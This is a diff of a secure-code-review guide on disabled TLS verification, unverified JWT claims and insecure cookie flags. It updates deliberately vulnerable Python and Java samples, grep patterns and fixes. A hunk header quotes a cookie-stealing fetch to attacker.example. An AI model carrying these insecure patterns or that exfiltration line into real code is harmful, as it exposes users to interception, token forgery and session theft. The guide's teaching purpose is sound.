@@ -25,7 +25,7 @@ The unsafe assumption is that the network is honest, the token payload is author
 | Pattern | Where to look | Red flags |
 | --- | --- | --- |
 | **TLS / HTTPS verification disabled** | `requests.get(..., verify=False)`, custom `TrustManager` that accepts all certs, `NODE_TLS_REJECT_UNAUTHORIZED=0`, gRPC/HTTP clients with insecure channel creds | Comments like “fix cert later,” test code shipped to prod |
-| **JWT signature / key mishandling** | `verify_signature=False`, hardcoded `secretkey`, accepting `alg: none`, parsing payload without `jwt.decode` validation, JWKS without issuer/audience checks | Auth middleware that only base64-decodes the middle segment |
+| **JWT signature / key mishandling** | `get_unverified_claims`, hardcoded HMAC secrets, accepting `alg: none`, JWKS without issuer/audience checks | Auth middleware that trusts base64 payload segments |
 | **Insecure HTTP cookie flags** | `set_cookie` without `httponly`/`secure`/`samesite`, legacy servlet cookies, framework session defaults | Session ID in URL, year-long `Max-Age`, logout that only clears client cookie |
 | **Hardcoded secrets** (related) | API keys, DB passwords, signing keys in source | See [4.32 Review Hardcoded Secrets](4-32-review-hardcoded-secrets.md) |
 | **Weak or custom crypto** (related) | MD5 passwords, home-grown AES, mixed hash/encrypt | See [4.12](4-12-review-cryptographic-implementation.md), [4.36](4-36-review-non-standard-crypto-practices.md), [4.38](4-38-review-encryption-decryption-mistakes.md) |
@@ -101,12 +101,10 @@ fetch('https://attacker.example/?c=' + document.cookie)
 
 ```python
 requests.get(url, verify=False)
-requests.get(user_url, verify=False)  # SSRF + MITM
 httpx.Client(verify=False)
-ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-jwt.decode(token, options={"verify_signature": False})
-jwt.decode(token, "changeme", algorithms=["HS256", "none"])
-resp.set_cookie("session", sid, httponly=False, secure=False)
+from jose import jwt as jose_jwt
+jose_jwt.get_unverified_claims(token)  # used for auth without signature check
+response.set_cookie("auth_token", sid, httponly=False, secure=False)
 urllib3.disable_warnings()  # often paired with verify=False
 ```
 
@@ -157,40 +155,44 @@ grpc.WithTransportCredentials(insecure.NewCredentials())
 ## Sample Vulnerable Code in Python
 
 ```python
-import jwt
-import requests
-from flask import Flask, make_response, redirect, request
+import httpx
+from jose import jwt as jose_jwt
+from starlette.applications import Starlette
+from starlette.responses import JSONResponse, RedirectResponse
+from starlette.routing import Route
 
-app = Flask(__name__)
-JWT_SECRET = "changeme"  # hardcoded; rotation not supported
-
-@app.route("/login", methods=["POST"])
-def login():
-    session_id = issue_session(request.form["username"])
-    resp = make_response(redirect("/dashboard"))
+async def login(request):
+    session_id = issue_session(await request.form())
+    response = RedirectResponse("/dashboard", status_code=302)
     # Insecure cookie: no HttpOnly, Secure, or SameSite
-    resp.set_cookie("session", session_id, httponly=False, secure=False)
-    return resp
+    response.set_cookie("sid", session_id, httponly=False, secure=False)
+    return response
 
-@app.route("/api/me")
-def api_me():
+async def api_me(request):
     token = request.headers.get("Authorization", "").removeprefix("Bearer ")
-    # Forged tokens accepted — signature not verified
-    user = jwt.decode(token, options={"verify_signature": False})
-    return {"user": user}
+    # Trusts unverified claims — signature never checked before authorization
+    claims = jose_jwt.get_unverified_claims(token)
+    return JSONResponse({"user": claims})
 
-@app.route("/sync")
-def sync_partner():
-    url = request.args["url"]  # attacker-controlled partner URL
+async def sync_partner(request):
+    partner = request.query_params["partner"]  # attacker-controlled HTTPS target
     # TLS certificate verification disabled — MITM possible
-    return requests.get(url, verify=False, timeout=10).text
+    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
+        r = await client.get(partner)
+    return JSONResponse({"body": r.text})
+
+app = Starlette(routes=[
+    Route("/login", login, methods=["POST"]),
+    Route("/api/me", api_me),
+    Route("/sync", sync_partner),
+])
 ```
 
 ## Step-by-Step Review Walkthrough
 
 1. **Search for TLS verification bypass.** Grep `verify=False`, `CERT_NONE`, `check_hostname = False`, and custom trust managers. Ask which environments use the code; test-only paths must not ship in production builds.
 2. **Trace outbound HTTPS from user-influenced URLs.** In the sample, `sync_partner` fetches arbitrary URLs without validation—this overlaps SSRF ([4.14](4-14-review-ssrf.md)). Even for fixed partners, disabling verification invites MITM credential theft.
-3. **Locate JWT parse and authorize paths.** In `api_me`, claims drive behavior without signature verification. Find every `jwt.decode`, library wrappers, and API gateways that forward `X-User-Id` without validation.
+3. **Locate JWT parse and authorize paths.** In `api_me`, claims from `get_unverified_claims` drive behavior without signature verification. Find every `jwt.decode`, library wrappers, and API gateways that forward `X-User-Id` without validation.
 4. **Review signing key resolution.** Static `JWT_SECRET`, shared dev keys, missing JWKS fetch, and no `iss`/`aud`/`exp` checks are common. Confirm allowed algorithms are explicit (reject `none`).
 5. **Audit cookie setters on login and refresh.** Match `login()` against policy: HttpOnly (anti-XSS theft), Secure (HTTPS only), SameSite (CSRF posture). See [4.33](4-33-review-insecure-cookie-configuration.md) for depth.
 6. **Walk related insecure practices.** In one service, hardcoded secrets often appear beside disabled TLS verify—fix both in the same change set.
@@ -213,18 +215,22 @@ def sync_partner():
 ### Java
 
 ```java
-// Trust-all TLS + hardcoded API key (insecure coding cluster)
-HttpsURLConnection conn = (HttpsURLConnection) new URL(userSuppliedUrl).openConnection();
-conn.setSSLSocketFactory(trustAllSocketFactory);
-conn.setRequestProperty("Authorization", "Bearer sk_live_hardcoded");
+// OkHttp client with permissive hostname verifier on user-supplied URL
+OkHttpClient client = new OkHttpClient.Builder()
+    .hostnameVerifier((hostname, session) -> true)
+    .build();
+Request req = new Request.Builder().url(userSuppliedUrl)
+    .header("Authorization", "Bearer hardcoded-partner-token")
+    .build();
 
-// JWT: signature verification not enforced
-Claims claims = Jwts.parser()
-    .setSigningKey("changeme")
+// JWT: parser accepts HS256 with static secret only — no aud/iss
+Claims claims = Jwts.parserBuilder()
+    .setSigningKey("changeme".getBytes(StandardCharsets.UTF_8))
+    .build()
     .parseClaimsJws(jwt).getBody();
 
-// Cookie without HttpOnly, Secure, or SameSite
-Cookie c = new Cookie("session", session.getId());
+// Servlet cookie without HttpOnly, Secure, or SameSite
+Cookie c = new Cookie("JSESSIONID", session.getId());
 response.addCookie(c);
 ```
 
@@ -270,16 +276,17 @@ http.SetCookie(w, &http.Cookie{Name: "session", Value: sid, Path: "/"})
 
 ### Python
 
-**TLS: always verify server certificates.** Use default verification; pin corporate roots via `verify=` path or system trust store—not `verify=False`.
+**TLS: always verify server certificates.** Use default verification in httpx or requests; pin corporate roots via `verify=` path or system trust store—not `verify=False`.
 
 ```python
-import requests
+import httpx
 
-# Default: verifies hostname and certificate chain
-resp = requests.get("https://api.partner.example/v1/report", timeout=10)
-
-# Custom CA bundle (corporate proxy) — still verifies
-resp = requests.get(url, verify="/etc/ssl/certs/corporate-ca.pem", timeout=10)
+async def fetch_export(base_url: str, ca_bundle: str | None = None) -> bytes:
+    verify: str | bool = ca_bundle if ca_bundle else True
+    async with httpx.AsyncClient(verify=verify, timeout=10.0) as client:
+        resp = await client.get(f"{base_url.rstrip('/')}/v1/export")
+        resp.raise_for_status()
+        return resp.content
 ```
 
 **Important:** Never set `verify=False` except in isolated tests. If tests need it, gate with an explicit non-production flag that fails closed in CI for release artifacts.
@@ -303,12 +310,12 @@ def current_user(token: str) -> dict:
 **Cookies: set HttpOnly, Secure, and SameSite.**
 
 ```python
-resp.set_cookie(
-    "session",
+response.set_cookie(
+    "sid",
     session_id,
     httponly=True,
     secure=True,
-    samesite="Lax",
+    samesite="lax",
     max_age=900,
 )
 ```
